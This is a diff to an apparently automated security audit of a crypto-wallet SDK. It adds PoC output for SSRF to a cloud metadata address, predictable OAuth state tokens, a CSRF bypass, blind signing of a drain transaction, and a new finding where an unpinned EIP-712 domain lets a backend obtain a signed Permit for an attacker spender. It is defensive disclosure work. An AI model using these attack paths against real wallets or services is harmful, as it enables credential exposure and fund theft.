@@ -23,6 +23,7 @@
 | **S5** | `validateEip712TypedData` missing `primaryType`-in-`types` membership check | **Confirmed by PoC** | LOW |
 | **S6** | MCP financial-action confirmation-gate asymmetry (`buy_token`/perps vs `transfer_tokens`/`send_solana_transaction`) | **Confirmed by PoC** | MEDIUM |
 | **S7** | CVE-2026-40895: follow-redirects 1.15.11 custom-header leak in `@phantom/auth2` | **Confirmed by PoC** | MEDIUM |
+| **S8** | Backend-controlled EIP-712 domain in `PerpsClient.withdrawFromSpot` `authorizeStep` — blind signing, absent `verifyingContract` allowlist (CWE-345) | **Confirmed by PoC** | MEDIUM |
 | F1 | `randomUUID()` silent fallback + `randomString()` unconditional `Math.random` | Follow-on | LOW |
 | F2 | 402 `preparedTx` blind-signing path | Superseded — see confirmed S3 (asymmetry framing) | MEDIUM |
 | R1 | Developer-config `apiBaseUrl`/`authApiBaseUrl` SSRF | **Rejected** | — |
@@ -107,16 +108,40 @@ MCP `buyTokenAction.run()` handler end-to-end.
 
 #### Confirmation / Evidence
 
-*(Leave blank — reviewer fills in after live run)*
+Verbatim stdout from the S1 PoC (live run, 2026-06-04, `bash autofyn_audit/run_exploits.sh`):
 
 ```
-LAYER 1 (validator asymmetry):
-  validateRpcUrl('https://169.254.169.254/...') threw: rpcUrl hostname is not permitted: 169.254.169.254
-  resolveSolanaRpcUrl('solana:101', 'https://169.254.169.254/...') returned: [URL] (not blocked)
+── LAYER 1: Validator asymmetry (IMDS IP, no network dial) ──────────────
+  Testing: validateRpcUrl vs resolveSolanaRpcUrl on https://169.254.169.254/latest/meta-data/
+  [CONFIRMED] validateRpcUrl('https://169.254.169.254/latest/meta-data/')
+              threw: rpcUrl hostname is not permitted: 169.254.169.254
+  [CONFIRMED] resolveSolanaRpcUrl('solana:101', 'https://169.254.169.254/latest/meta-data/')
+              returned: https://169.254.169.254/latest/meta-data/
+              (link-local/IMDS IP accepted — no IP block in validateHttpsUrl)
 
-LAYER 2 (network fires):
-  Capture server received POST from Connection.getLatestBlockhash()
-  [Reviewer confirms: inbound request logged at capture server]
+  LAYER 1: ASYMMETRY CONFIRMED
+
+── LAYER 2: Network fires through Solana path, blocked on EVM path ─────
+  Capture server (HTTPS self-signed) listening on: https://127.0.0.1:43019
+  NOTE: In a real attack, https://169.254.169.254 is the SSRF target.
+        127.0.0.1 is used here as safe stand-in; the IP check is identical (absent).
+  [CONFIRMED] validateRpcUrl('https://127.0.0.1:43019') threw: rpcUrl hostname is not permitted: 127.0.0.1
+  [CONFIRMED] resolveSolanaRpcUrl returned: https://127.0.0.1:43019
+  Dialing https://127.0.0.1:43019 via new Connection().getLatestBlockhash()...
+  [CONFIRMED] Capture server received inbound request:
+    method: POST
+    url: /
+    host: 127.0.0.1:43019
+    timestamp: 2026-06-04T20:39:52.358Z
+  SSRF reachable: the SDK Connection dialed the attacker-supplied URL
+  with NO IP-range check. https://169.254.169.254/ would be reached identically.
+
+  LAYER 2: NETWORK DIAL CONFIRMED
+
+=== S1: Inconsistent Solana RPC SSRF ===
+  Layer 1 (validator asymmetry, IMDS IP): CONFIRMED
+  Layer 2 (network fires, loopback HTTPS): CONFIRMED
+  Overall: CONFIRMED
 ```
 
 #### Real-World Impact
@@ -239,13 +264,39 @@ The severity (LOW) is based on the difficulty of exploiting the weak randomness 
 
 #### Confirmation / Evidence
 
-*(Leave blank — reviewer fills in after live run)*
+Verbatim stdout from the S2 PoC (live run, 2026-06-04, `bash autofyn_audit/run_exploits.sh`):
 
 ```
-generateSessionId() source verified: uses Math.random() exclusively, zero CSPRNG path.
-Insecure randomness defect CONFIRMED: OAuth state token contains no CSPRNG entropy.
-Math.random() determinism demonstrated via same-isolate record-and-replay.
+  ── Step 1: Verify Math.random() is the sole entropy source ──
+  generateSessionId() produced: session_8y8vuj6y9imuwls866hmw_<timestamp>
+  Math.random() calls made:     2 (expected 2 per call)
+  crypto.getRandomValues called: false (expected false)
+
+  No CSPRNG path: CONFIRMED
+
+  ── Step 2: Record Math.random() outputs and replay to reproduce session ID ──
+  (This is record-and-replay, NOT state recovery from observable session IDs.)
+  (It demonstrates Math.random() determinism within one isolate only.)
+
+  Target session ID (generated while recording):
+    recorded r1 = 0.537232676945299 → 'jc94llhvhp'
+    recorded r2 = 0.3659204451595739 → 'd68du1ekdtj'
+  Reproduced prefix: session_jc94llhvhpd68du1ekdtj
+  Actual prefix:     session_jc94llhvhpd68du1ekdtj
+
+  Record-and-replay match: CONFIRMED
+  → Math.random() is deterministic; same recorded floats reproduce the session ID exactly.
+  → The OAuth state token contains no CSPRNG entropy.
+
+=== S2: Insecure Randomness (CWE-330/338) — OAuth State CSRF Token ===
+  No CSPRNG path in generateSessionId():  CONFIRMED
+  Math.random() determinism (record/replay): CONFIRMED
+  Insecure randomness defect:              CONFIRMED
 ```
+
+The full PoC stdout (Step 3 PRNG entropy analysis) is reproducible via the harness; the
+above excerpt is the load-bearing evidence. The record-and-replay is honest same-isolate
+determinism, NOT state recovery from observable session IDs (see Observability Caveat).
 
 #### Real-World Impact
 
@@ -401,15 +452,40 @@ stubbed session/address lookup — the PoC must not require real keys (per audit
 
 #### Confirmation / Evidence
 
-*(Leave blank — reviewer fills in after live run)*
+Verbatim stdout from the S3 PoC (live run, 2026-06-04, `bash autofyn_audit/run_exploits.sh`):
 
 ```
-(a) [LIVE]  402 server received request from PhantomApiClient:
-(b) [LIVE]  Auto-handler decoded preparedTx, forwarded to signer, NO validation:
-(c) [LIVE]  SystemProgram.transfer instruction reached stub signer unchecked:
-(ref)       Reproduced schema rejects same tx (reference contrast, not live schema run):
-Pass condition: (a)+(b)+(c) — real auto-handler blindly signed drain tx
+── Step 2: Loopback HTTP 402 server + PhantomApiClient + stub signer ───────
+  Loopback 402 server listening on http://127.0.0.1:41563
+
+── Step 3: Live assertions (real PhantomApiClient + auto-handler) ───────────
+  (a) [LIVE] Loopback server received ≥1 request from PhantomApiClient: PASS (count=2)
+      GET /v1/anything at 2026-06-04T20:40:24.267Z
+  (b) [LIVE] Auto-handler decoded preparedTx and forwarded to signer (no validation): PASS
+  (c) [LIVE] SystemProgram.transfer instruction reached stub signer unchecked: PASS
+      programId: 11111111111111111111111111111111 — auto-handler accepted this without any validation
+
+── Step 4: [reference contrast] reproduced PaymentTransactionSchema ────────
+  [reference contrast] reproduced PaymentTransactionSchema (faithful copy of
+  pay-api-access.ts lines 16-112; the real schema is not standalone-importable
+  under tsx, see README) REJECTS the same tx — demonstrating the documented
+  asymmetry between the explicit tool path and the auto-handler.
+    issue: Payment transaction must not contain SOL transfers or system instructions (native SOL payment is forbidden).
+
+=== S3: Auto-402 Blind-Signing Asymmetry ===
+  (a) [LIVE]  402 server received request from PhantomApiClient: CONFIRMED
+  (b) [LIVE]  Auto-handler reached decode+sign step, no validation: CONFIRMED
+  (c) [LIVE]  SystemProgram drain tx reached stub signer unchecked: CONFIRMED
+  (ref)       Reproduced schema rejects same tx (reference contrast only): YES
+  Overall:                                                          CONFIRMED
+  Pass condition: (a)+(b)+(c) only — real auto-handler blindly signed drain tx
 ```
+
+The CONFIRMED verdict rests SOLELY on the live (a)+(b)+(c) assertions against the real
+`PhantomApiClient` + auto-handler. The schema-rejection line is a labeled reference
+reproduction (`payment-schema.mjs`, verbatim copy of `pay-api-access.ts:16-112`) shown
+for ILLUSTRATIVE contrast only — see the "What is live-confirmed vs. shown by reference"
+note above.
 
 #### Real-World Impact
 
@@ -490,16 +566,25 @@ BrowserAuthProvider.resumeAuthFromRedirect("google")
 
 #### Confirmation / Evidence
 
-*(Leave blank — reviewer fills in after live run)*
+Verbatim stdout from the S4 PoC (live run, 2026-06-04, `bash autofyn_audit/run_exploits.sh`):
 
 ```
-Case 1 (attack — empty sessionStorage):
-  resumeAuthFromRedirect returned walletId="ATTACKER_WALLET", organizationId="ATTACKER_ORG"
-  CSRF guard skipped on empty sessionStorage: CONFIRMED
+── Case 1 (attack): empty sessionStorage — guard skipped ──────────────────
+  [RESULT] AuthResult returned from attacker URL params:
+    walletId:       ATTACKER_WALLET
+    organizationId: ATTACKER_ORG
+    authUserId:     ATTACKER_USER
+    sessionId:      (provider param) ATTACKER_SESSION_ANY
+  [CONFIRMED] CSRF guard skipped on empty sessionStorage — attacker walletId accepted.
 
-Case 2 (contrast — present+mismatched sessionId):
-  threw: "Session ID mismatch - possible session corruption or replay attack"
-  Guard fires when context.sessionId is truthy: CONFIRMED
+── Case 2 (contrast): sessionStorage has legit sessionId — guard fires ────
+  [CONFIRMED] Guard threw: Session ID mismatch - possible session corruption or replay attack
+  The guard fires correctly when context.sessionId is truthy and mismatched.
+
+=== S4: BrowserAuthProvider Conditional CSRF Bypass ===
+  (a) Empty context → guard skipped → attacker walletId accepted: CONFIRMED
+  (b) Present+mismatched context → guard fires (throws mismatch):  CONFIRMED
+  Overall:                                                          CONFIRMED
 ```
 
 #### Real-World Impact
@@ -579,13 +664,30 @@ sign_evm_typed_data MCP tool ← attacker-supplied typedData (z.object with z.re
 
 #### Confirmation / Evidence
 
-*(Leave blank — reviewer fills in after live run)*
+Verbatim stdout from the S5 PoC (live run, 2026-06-04, `bash autofyn_audit/run_exploits.sh`):
 
 ```
-Negative control (validator runs): CONFIRMED (threw on types='notanobject')
-Case A (primaryType not in types): CONFIRMED (no throw)
-Case B (EIP712Domain missing):     CONFIRMED (no throw)
-Case C (types[primaryType] = []):  CONFIRMED (no throw)
+── Negative control: clearly invalid shape ──────────────────────────────────
+  [PASS] Negative control threw (validator is running): typedData.types must be an object mapping type names to field arrays
+
+── Case A: primaryType NOT a key in types ───────────────────────────────────
+  primaryType='MISSING_TYPE', keys(types)=['EIP712Domain','Permit']
+  [CONFIRMED] validateEip712TypedData did NOT throw — primaryType not in types is accepted.
+
+── Case B: EIP712Domain missing from types ──────────────────────────────────
+  primaryType='Permit', keys(types)=['Permit'] (no EIP712Domain)
+  [CONFIRMED] validateEip712TypedData did NOT throw — EIP712Domain absence is accepted.
+
+── Case C: types[primaryType] is an empty array ─────────────────────────────
+  primaryType='Transfer', types.Transfer=[] (empty — zero fields)
+  [CONFIRMED] validateEip712TypedData did NOT throw — empty types array is accepted.
+
+=== S5: validateEip712TypedData primaryType-in-types Gap ===
+  Case A (primaryType not in types):        CONFIRMED (no throw)
+  Case B (EIP712Domain missing):            CONFIRMED (no throw)
+  Case C (types[primaryType] is empty []):  CONFIRMED (no throw)
+  Negative control (validator is live):     CONFIRMED (threw)
+  Overall:                                  CONFIRMED
 ```
 
 #### Real-World Impact
@@ -823,6 +925,152 @@ Run: `cd packages/auth2 && npx tsx /path/to/autofyn_audit/exploits/s7-follow-red
    (axios ≥1.4.0) so they are stripped before any redirect.
 3. **Audit:** Review all other packages' transitive `follow-redirects` versions for the same
    stale-dep pattern.
+
+---
+
+### S8 — Backend-Controlled EIP-712 Domain in PerpsClient.withdrawFromSpot authorizeStep (Blind Signing, CWE-345)
+
+**Severity:** MEDIUM  
+**Provisional CVSS:** AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N (~5.9)  
+*(AC:H: requires malicious/compromised/MitM backend at the TLS-protected PHANTOM_API_BASE_URL.
+ UI:R: user or agent must invoke `withdraw_from_hyperliquid_spot execute:true`.
+ NOT independently reachable from MCP tool parameters. NOT CRITICAL.)*  
+**CWE:** CWE-345 (Insufficient Verification of Data Authenticity)
+
+**Affected package:** `@phantom/perps-client`  
+**Affected file:** `packages/perps-client/src/PerpsClient.ts:356-361`  
+**Quote type:** `RelayWithdrawalV2Quote.authorizeStep` (`types.ts:233-241`)  
+**Contrast (pinned):** `buildExchangeActionTypedData` → `HYPERLIQUID_EXCHANGE_DOMAIN`;
+`buildUsdClassTransferTypedData` → `HYPERLIQUID_SIGN_TRANSACTION_DOMAIN`;
+`depositStep` (`PerpsClient.ts:380-385`) → `{ ...HYPERLIQUID_SIGN_TRANSACTION_DOMAIN, chainId }`
+
+#### Attacker and Trust Boundary
+
+Attacker = malicious/compromised/MitM'd Phantom backend at `PHANTOM_API_BASE_URL` (default
+`https://api.phantom.app`, TLS-protected). The `GET /swap/v2/spot/bridge-initialize` response is
+100% backend-controlled. There is **no independent MCP-caller reachability**: the
+`WithdrawFromHyperliquidSpotSchema` accepts only `amountUsdc`, `destinationChainId`, `buyToken`,
+`execute`, `walletId`, `derivationIndex` — NO EIP-712 field. The only attacker path is a
+backend-controlled `bridge-initialize` response. SAME trust class as S3/S7. Precondition stated
+honestly.
+
+#### Technical Description
+
+`PerpsClient.withdrawFromSpot` (`PerpsClient.ts:356-361`) passes the four EIP-712 fields
+`{domain, types, primaryType, message}` from the backend-supplied `authorizeStep` **verbatim**
+to `this.signTypedData`. The `domain` object includes `verifyingContract` (`types.ts:235`).
+There is **no domain pinning, no `verifyingContract` allowlist, and no validation** on this path.
+
+Every other perps signing site pins the domain from constants:
+
+- `buildExchangeActionTypedData` → `HYPERLIQUID_EXCHANGE_DOMAIN` (`verifyingContract = 0x000…000`, `constants.ts:16-20`)
+- `buildUsdClassTransferTypedData` (deposit/withdraw) → `HYPERLIQUID_SIGN_TRANSACTION_DOMAIN` (`verifyingContract = 0x000…000`, `constants.ts:9-12`)
+- `depositStep` (`PerpsClient.ts:380-385`) → `{ ...HYPERLIQUID_SIGN_TRANSACTION_DOMAIN, chainId }` (only `types`/`eip712PrimaryType` from backend)
+
+The `authorizeStep` is the **single signing site** in the entire perps surface where the backend
+controls all four EIP-712 fields including `verifyingContract`.
+
+**Fix framing:** the gap is an **absent `verifyingContract`/domain allowlist** on the
+backend-controlled `authorizeStep` signing path. This is NOT a missing `validateEip712TypedData`
+call — that validator (`parsers/src/index.ts:43-65`) checks only structural shape (JS types of
+types/primaryType/domain/message). It does **NOT** check `verifyingContract`, domain name, or any
+allowlist. Calling it would **NOT** stop this attack.
+
+#### Independence from S3 and S7
+
+- **Package:** `@phantom/perps-client` — distinct from `@phantom/cli` (S3) and `@phantom/auth2` (S7).
+- **CWE:** CWE-345 (unpinned EIP-712 domain) — distinct from S3 (generic blind-sign asymmetry) and S7 (CWE-201 credential-exfil via stale dep).
+- **Code path:** `withdrawFromSpot` authorizeStep EIP-712 sign — distinct from S3's module-load 402 `setPaymentHandler` and S7's follow-redirects header strip.
+- **New capability:** off-platform-redeemable EVM signature over an attacker-chosen `verifyingContract`. S3's blind-sign of a Solana `preparedTx` stays in-flow (same backend broadcasts it); S7 exfiltrates a short-lived credential. S8 gives the backend a capability it otherwise lacks: an EVM private-key signature over an arbitrary EIP-712 struct redeemable by the recipient contract directly, without any further backend involvement.
+
+Shared precondition (backend compromise) acknowledged; all three are distinct on
+package + CWE + impact, meeting the round-3 Rule bar.
+
+#### Impact
+
+A flow-controlling backend already relays whatever Hyperliquid action it constructs. The NEW
+capability `authorizeStep` grants is qualitatively different: the backend can hand the KMS an
+**arbitrary EIP-712 struct over an arbitrary `verifyingContract`** — for example,
+`Permit{owner:user, spender:attacker, value:MAX_UINT256}` over a real ERC-20 token contract — and
+obtain a KMS signature over the user's EVM key that is **redeemable off-platform** (e.g.
+ERC-2612/Permit2/Seaport/DAI permit) without any further backend cooperation. That redemption
+does not route through the Phantom proxy.
+
+**Honesty caps (MUST be observed):**
+- This is **MEDIUM**, not critical. Precondition = backend compromise (AC:H, UI:R).
+- **The PoC proves only that the unvalidated attacker domain/message reaches the signer and that
+  no allowlist/validation throws.** KMS is opaque (stub signer used). **Live fund loss /
+  permit redemption is NOT demonstrated.**
+- The off-platform-redeemable-permit impact is an *argued* consequence of an attacker-chosen
+  `verifyingContract`, not a live-drained demonstration. The EIP-712 spec guarantees that a
+  signature over `verifyingContract=<token>` is verifiable by that token contract; this is the
+  property the attack exploits.
+
+#### Confirmation / Evidence
+
+Verbatim stdout from the S8 PoC (live run, 2026-06-04, `bash autofyn_audit/run_exploits.sh`; exit 0, deterministic across two runs):
+
+```
+── Step 1: Imported REAL PerpsClient.ts source ──────────────────────────────────────
+  [OK] PerpsClient loaded from source: /home/agentuser/repo/packages/perps-client/src/PerpsClient.ts
+
+── Step 2: Malicious quote built ────────────────────────────────────────────────────
+  authorizeStep.domain.verifyingContract: 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+  authorizeStep.primaryType:              Permit
+  authorizeStep.message.spender:          0xattacker000000000000000000000000000000000
+
+── Step 4: Calling withdrawFromSpot (backend-controlled authorizeStep path) ─────────
+  [OK] withdrawFromSpot completed without throwing
+  signTypedData call count (withdrawFromSpot): 2
+
+── Step 5: Assertions — attacker path (withdrawFromSpot authorizeStep) ─────────────
+  (1) signTypedData called at least once by withdrawFromSpot: PASS
+  (2) call[0].domain.verifyingContract === attacker-chosen address: PASS
+      got:      0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+      expected: 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+  (3a) call[0].primaryType === "Permit": PASS
+       got: Permit
+  (3b) call[0].message.spender === attacker address: PASS
+       got:      0xattacker000000000000000000000000000000000
+       expected: 0xattacker000000000000000000000000000000000
+  (3c) No validation error thrown before signer ran (signer WAS reached): PASS
+
+── Step 6: Negative control — deposit() uses pinned verifyingContract ────────────────
+  [OK] deposit() completed without throwing
+  (4) deposit() call[0].domain.verifyingContract === pinned zero address: PASS
+      got:      0x0000000000000000000000000000000000000000
+      expected: 0x0000000000000000000000000000000000000000 (HYPERLIQUID_SIGN_TRANSACTION_DOMAIN)
+      [CONTRAST] authorizeStep: 0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef
+      [CONTRAST] depositStep (pinned): 0x0000000000000000000000000000000000000000
+
+  (1) [LIVE] Attacker verifyingContract reached signer verbatim:       CONFIRMED
+  (2) [LIVE] Attacker primaryType + message.spender reached signer:    CONFIRMED
+  (3) [LIVE] No validation error blocked the signer (no allowlist):    CONFIRMED
+  (4) [LIVE] Pinned sibling deposit() uses 0x000...000 (unaffected):  CONFIRMED
+  Overall:                                                              CONFIRMED
+
+>>> S8: PerpsClient authorizeStep blind EIP-712 sign (CWE-345): CONFIRMED <<<
+```
+
+Note: `signTypedData call count (withdrawFromSpot): 2` — `withdrawFromSpot` signs twice
+(the backend-controlled `authorizeStep` first, then the pinned `depositStep`). The
+assertions target `call[0]` (the `authorizeStep`); the negative-control `deposit()` sign
+is the subsequent recorded call and shows the pinned `0x000…000` `verifyingContract`.
+
+#### PoC Reference
+
+`autofyn_audit/exploits/s8-perps-eip712-blind-sign/run.mjs`  
+Run: `cd packages/perps-client && npx tsx /path/to/autofyn_audit/exploits/s8-perps-eip712-blind-sign/run.mjs`
+
+#### Remediation
+
+1. **Primary:** Add a `verifyingContract`/domain allowlist for the `authorizeStep` signing path.
+   For the Relay V2 bridge, the valid `verifyingContract` addresses are known and small; pin them
+   in `constants.ts` and validate before calling `signTypedData`.
+2. **Defense-in-depth:** Apply the same pattern as the sibling `depositStep` (`PerpsClient.ts:380-385`):
+   construct the `domain` from a constant (`RELAY_AUTHORIZE_DOMAIN`) and only allow the backend to
+   extend `types` — never control `verifyingContract`.
+3. **Note:** adding a `validateEip712TypedData` call alone is NOT sufficient — see Fix framing above.
 
 ---
 
